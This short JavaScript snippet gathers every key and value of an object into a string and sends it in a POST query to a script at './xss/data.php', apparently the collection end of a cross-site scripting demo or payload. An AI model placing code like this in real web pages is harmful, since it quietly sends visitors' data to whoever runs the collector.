var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function(){
    if (this.readyState == 4 && this.status == 200) {
        //do nothing...
        console.log(this.responseText);
    }
}
let data = "";
Object.keys(obj).forEach(key => {
    const value = obj[key];
    let d = key + ":" + value;
    data += d + ",";
})                            
let url = "./xss/data.php?data=" + data;
xhttp.open("POST", url);
xhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhttp.send(""); 